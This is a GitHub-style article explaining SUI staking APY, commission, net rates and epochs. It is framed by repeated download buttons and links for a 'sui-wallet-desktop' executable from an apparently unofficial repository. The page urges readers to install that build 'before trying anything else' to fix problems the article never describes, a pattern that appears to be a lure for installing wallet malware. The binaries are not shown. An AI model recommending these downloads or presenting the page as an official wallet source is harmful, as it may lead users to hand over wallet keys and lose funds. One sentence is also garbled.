![SUI Wallet](assets/banner-article.png)

# SUI staking APY explained

The APY is a network rate that moves with the epoch, not a promise on your balance.

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## Short answer

The APY on the staking screen is a snapshot of the annualised rate implied by the network's rewards and the total stake at that moment. It moves as those change, it is stated before commission is taken, and it is a description of a rate rather than a promise of one. No page can quote you a figure that holds.

## Where the rate comes from

Staking rewards come from the network, not from the validator's own pocket, and the rate the app displays is derived from how those rewards compare with the total amount staked. When more SUI is staked, the same reward pool is shared more widely, and the rate moves down.

That is the mechanism in one paragraph, and it explains the thing readers find most confusing: the number is not a setting anybody chose, and no validator can hold it steady by promising to.

The derivation also explains why two readers looking at the same screen can describe different numbers: they may be looking at different moments, or at different validators, or at the gross rate and the net one. None of them is wrong, and the disagreement is a vocabulary problem rather than a data problem.

## Why it moves

Two forces move the rate. The network's reward conditions change, and the amount staked across the network changes. Neither is under your control or the validator's, which is why a figure read in January and a figure read in June can differ without anything having gone wrong.

This is also why a page quoting a number is out of date the moment it is published. The screen is the source; anything else is a memory of the screen.

A reader watching the rate for a signal will find one that changes without an event behind it. That is the nature of a derived figure: it responds to a pool and to participation, not to a decision anyone made on a particular morning.

## Commission and the net figure

Commission is the validator's cut, taken from what your stake earns before it reaches you. The net rate is the displayed rate minus the commission, and the two are shown separately because they answer different questions about the same position.

A validator with a high rate and a high commission can pay less than one with a lower rate and a small cut. Reading the two together is the only honest comparison, and it is why the validator list puts both in the same row.

## The epoch boundary

Rewards accrue inside the position rather than arriving as a deposit, so the rate is not something you can watch land in your balance each period. What the position is worth grows where it sits, and the screen shows the total.

That is the practical difference between this and a savings account: there is no statement of interest received, only a position that is larger when you look at it. [Staking SUI in the wallet app](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/staking-sui-in-the-wallet-app.md) covers where that value ends up when you unstake.

## What the rate does not include

Three exclusions worth knowing. The rate is before commission. It says nothing about the validator's uptime, so a validator that misses epochs will not deliver it. And it is annualised, which is a way of expressing a rate rather than a schedule of payments.

A reader who treats the number as a forecast will be disappointed by a validator that underperforms; a reader who treats it as a description of current conditions will not be surprised by anything.

One more thing the number does not tell you is how long a position has been open. A rate is a statement about a period, not about your position, so a stake opened yesterday and one opened last month are described by the same figure while earning differently. The position's value on screen is the figures that reflects your own history.

## Comparing two rates honestly

Start from the same moment, on the same screen, and compare rate against commission rather than rate alone. Then check uptime, because a rate delivered nine times out of ten is not the rate on the label. Finally, weigh concentration if the two are otherwise equal.

[Choosing a Sui validator](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/choosing-a-sui-validator.md) takes that comparison step by step, including what to do when the figures are close enough that the decision does not matter much.

One last caution: the comparison is a snapshot, and the position you open today can be reviewed in a month without any urgency. Staking is reversible, if not instantly, so a choice made on a snapshot is not a decision that has to be lived with forever.

The numbers come from the app rather than from a page, so keep it on the current release: install from the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest), where the reported problems are fixed, and compare again on the same screen.

## FAQ

### What APY should I expect from Sui staking?

No page can tell you, because the rate depends on network conditions and the total stake at the time you look. The staking screen shows the current figure; treat it as a snapshot, not a contract.

### Is the APY fixed?

No. It is derived from network rewards and total stake, both of which change, and commission comes off the
top of whatever the rate happens to be.

### Why is my validator's rate lower than another's?

Different commission, different uptime, and a different moment of reading. Compare the two figures together on the same screen rather than at different times.

### Do rewards compound automatically?

Rewards accrue inside the position rather than being paid out and re-staked, so there is no separate compounding step to perform. The position grows where it sits.

### Does a higher rate mean a better validator?

No. A high rate with high commission and patchy uptime can pay less than a modest rate with a low commission and a clean record.
